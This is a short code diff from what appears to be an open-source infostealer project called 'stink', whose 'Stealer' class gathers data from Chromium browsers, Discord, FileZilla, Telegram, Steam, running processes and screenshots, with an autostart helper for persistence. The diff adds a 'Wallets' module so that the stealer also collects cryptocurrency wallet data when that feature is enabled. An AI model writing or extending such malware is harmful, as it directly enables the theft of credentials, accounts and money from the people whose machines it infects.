@@ -8,7 +8,7 @@ from stink.enums import Features, Utils
 from stink.utils import Autostart, Message
 from stink.helpers import functions, MemoryStorage
 from stink.helpers.config import MultistealerConfig, Browsers
-from stink.modules import Chromium, Discord, FileZilla, Processes, Screenshot, System, Telegram, Steam
+from stink.modules import Chromium, Discord, FileZilla, Processes, Screenshot, System, Telegram, Steam, Wallets
 
 
 class Stealer(Thread):
@@ -166,6 +166,13 @@ class Stealer(Thread):
                     "Programs/Steam",
                 ),
                 "status": True if (Features.steam in features or Features.all in features) else False
+            },
+            {
+                "object": Wallets,
+                "arguments": (
+                    "Wallets",
+                ),
+                "status": True if (Features.wallets in features or Features.all in features) else False
             }
         ]
 
